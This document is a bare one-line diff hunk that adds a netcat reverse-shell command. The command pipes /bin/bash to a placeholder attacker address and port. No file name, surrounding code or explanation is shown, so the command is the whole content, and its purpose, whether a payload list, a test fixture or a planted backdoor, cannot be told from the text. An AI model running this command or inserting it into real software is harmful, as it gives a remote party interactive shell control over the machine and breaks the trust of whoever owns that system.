@@ -1,0 +1,1 @@
+nc -e /bin/bash REV_SHELL_IP REV_SHELL_PORT
